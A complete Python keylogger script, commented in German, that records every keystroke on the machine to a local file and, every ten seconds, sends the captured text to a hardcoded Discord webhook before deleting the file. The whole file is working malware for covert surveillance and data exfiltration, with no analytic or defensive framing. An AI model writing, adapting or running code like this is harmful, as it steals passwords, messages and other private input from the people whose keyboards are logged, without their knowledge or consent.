import keyboard, os
from threading import Timer
from discord_webhook import DiscordWebhook, DiscordEmbed

WEBHOOK_URL = "https://discord.com/api/webhooks/1405947482709557308/MP96vs59YcZ8XwN8YzQGvH3S7htAMtcNLJ_HO7JVBdFGFOzUEi7_fIuHCsn0hS2hbGOI"
LOG_FILE = "keylog.txt"
SEND_INTERVAL = 10  # seconds

webhook = DiscordWebhook(url=WEBHOOK_URL, content="Testnachricht von Webhook")
response = webhook.execute()
print(response.status_code)

def send_log():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as file:
            log_content = file.read()
        
        if log_content:
            webhook = DiscordWebhook(url=WEBHOOK_URL)
            embed = DiscordEmbed(title="Keylogger Log", description=f"```\n{log_content}\n```", color='03b2f8')
            webhook.add_embed(embed)
            response = webhook.execute()
            print(f"Webhook-Status: {response.status_code}")  # Debug-Ausgabe
        
        os.remove(LOG_FILE)
    
    Timer(SEND_INTERVAL, send_log).start()

def on_key_event(event):
    with open(LOG_FILE, "a") as file:
        if event.event_type == 'down':
            if event.name == 'space':
                file.write(' ')
            elif event.name == 'enter':
                file.write('\n')
            elif event.name == 'tab':
                file.write('\t')
            elif len(event.name) > 1:
                file.write(f'[{event.name}]')
            else:
                file.write(event.name)
            file.flush()
            os.fsync(file.fileno())

# Hook und Timer starten
keyboard.hook(on_key_event)
send_log()
keyboard.wait()